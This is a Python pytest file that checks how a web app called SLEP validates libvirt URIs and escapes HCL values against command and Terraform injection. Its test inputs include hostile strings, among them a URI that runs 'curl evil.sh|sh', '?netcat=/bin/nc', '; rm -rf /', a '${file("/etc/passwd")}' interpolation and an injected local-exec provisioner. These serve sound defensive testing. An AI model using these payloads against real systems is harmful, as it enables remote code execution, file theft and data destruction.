"""A connection URI is operator input that reaches three dangerous places.

SLEP takes a libvirt URI from a form and then:

  1. passes it to `virsh -c <uri>`
  2. writes it into variables.tf, which Terraform reads as HCL
  3. hands it to the libvirt provider, which opens an SSH connection with it

Each has its own way of turning a string into code, and all three are closed
today — by three different mechanisms, none of which had a test.

  * libvirt's own URI PARAMETERS are the sharpest edge. `?command=` tells the
    SSH transport which binary to run, so a URI alone is remote code execution
    with no injection of any kind — no quotes, no metacharacters, entirely
    well-formed. `?netcat=` and `?proxy=` are the same shape. The validator
    refuses parameters it does not know.

  * SHELL metacharacters in the URI are inert, but only because every virsh
    call passes a LIST argv. One `shell=True` or one f-string command would
    make `qemu:///system; rm -rf /` live, and that URI is accepted — correctly,
    since virsh will simply fail to parse it.

  * HCL is the one that looks safest and is not. `${file("/etc/passwd")}` in a
    Terraform string is evaluated unless the `$` is doubled, and a bare `"`
    closes the string and opens the file to arbitrary HCL — a `provisioner
    "local-exec"` block runs commands on the SLEP host itself.
"""
import re
import subprocess

import pytest
from fastapi import HTTPException

from backend import app as m
from backend import infra


# ------------------------------------------- libvirt's own URI parameters

@pytest.mark.parametrize("uri", [
    "qemu+ssh://u@h/system?command=/bin/sh",
    "qemu+ssh://u@h/system?command=curl evil.sh|sh",
    "qemu+ssh://u@h/system?netcat=/bin/nc",
    "qemu+ssh://u@h/system?proxy=native&command=id",
])
def test_a_uri_parameter_that_chooses_a_binary_is_refused(uri):
    """These need no injection at all: the URI is well-formed and libvirt does
    exactly what it says. This is the one that would actually be exploited."""
    with pytest.raises(HTTPException):
        m._validate_libvirt_uri(uri)


@pytest.mark.parametrize("uri", [
    "test:///default", "xen+ssh://h/", "esx://h/?no_verify=1",
    "--version", "-c/etc/passwd", "",
])
def test_only_a_qemu_uri_is_accepted(uri):
    """A scheme allowlist, so a URI cannot name a driver nobody intended — and
    a leading dash cannot become a virsh FLAG."""
    with pytest.raises(HTTPException):
        m._validate_libvirt_uri(uri)


@pytest.mark.parametrize("uri", [
    "qemu:///system",
    "qemu+ssh://admin@kvm-1.lan/system?no_verify=1",
])
def test_the_real_ones_still_work(uri):
    """A validator that refuses everything passes every test above."""
    assert m._validate_libvirt_uri(uri) == uri


# -------------------------------------------------- shell metacharacters

def test_virsh_is_never_handed_a_shell():
    """Shell metacharacters in a URI are harmless ONLY because every virsh call
    passes a list argv. This is what keeps that true: one shell=True, or one
    command built as a string, and `qemu:///system; rm -rf /` becomes live."""
    import inspect
    sources = [inspect.getsource(m)]
    from backend.runners import terraform_runner
    sources.append(inspect.getsource(terraform_runner))
    for src in sources:
        for line_no, line in enumerate(src.splitlines(), 1):
            if "virsh" not in line:
                continue
            if "subprocess" not in line and "run(" not in line and "Popen" not in line:
                continue
            assert "shell=True" not in line, "virsh invoked through a shell: %s" % line.strip()
            assert '["virsh"' in line or "['virsh'" in line or "normalize(" in line, (
                "virsh is not invoked with a list argv: %s" % line.strip())


def test_a_uri_with_metacharacters_is_inert_not_rejected():
    """Deliberately NOT refused: virsh fails to parse it and says so, which is a
    better answer than a validator pretending to know what a URI may contain.
    The safety comes from the argv, which the test above pins."""
    assert m._validate_libvirt_uri("qemu:///system; rm -rf /")


# ---------------------------------------------------------- HCL escaping

@pytest.mark.parametrize("raw", ['a"b', "a\\b", "a${x}b", 'a"${y}"b'])
def test_hcl_escapes_what_terraform_would_otherwise_evaluate(raw):
    """Two things are code inside an HCL double-quoted string: a bare `"` closes
    it, and a single `${` interpolates.

    Stated as "no UN-DOUBLED ${" rather than "the output does not contain
    ${x}", because the latter is false — `$${x}` contains `${x}` as a
    substring. The un-doubled form is what Terraform actually looks for, and
    writing the weaker assertion first is how this would have passed while
    testing nothing."""
    out = infra._hcl(raw)
    assert out.startswith('"') and out.endswith('"')
    body = out[1:-1]
    assert not re.search(r'(?<!\\)"', body), "an unescaped quote closes the string: %s" % out
    assert not re.search(r"(?<!\$)\$\{", body), "an un-doubled ${ interpolates: %s" % out


def test_an_interpolation_cannot_survive_into_a_generated_file():
    """${file("/etc/passwd")} in an HCL string is evaluated. Doubling the $ is
    what stops it, and it reads like a typo, so pin it."""
    assert infra._hcl('${file("/etc/passwd")}') == '"$${file(\\"/etc/passwd\\")}"'


def test_a_hostile_uri_cannot_add_hcl_to_a_generated_project():
    """The whole chain, end to end: a URI carrying a closing quote and a
    provisioner block must come out as DATA inside one string, not as HCL."""
    evil = 'qemu:///system"\nprovisioner "local-exec" { command = "id" }\n#'
    out = infra.generate("libvirt", {"provider": "libvirt", "uri": evil,
                                     "base_image": "https://x/noble.img"}, "")
    v = out["variables.tf"]
    block = re.search(r'variable "uri".*?\n\}', v, re.S)
    assert block, "no uri variable in the generated variables.tf"
    default = block.group(0)
    # the dangerous text may appear, but only escaped inside the one string
    assert '\\"' in default, "quotes were not escaped: %s" % default
    assert "\n" not in default.split("default", 1)[1].split("\n}")[0], (
        "a raw newline survived into the HCL string — the block is broken open")
    # and nothing outside that string looks like a new block
    rest = v.replace(default, "")
    assert "local-exec" not in rest, "the injected provisioner escaped the string"


def test_a_newline_never_reaches_the_file_at_all():
    """Belt and braces: the validator strips newlines before anything else sees
    the URI, so the HCL escape is the SECOND defence rather than the only one."""
    assert "\n" not in m._validate_libvirt_uri("qemu:///system\n")
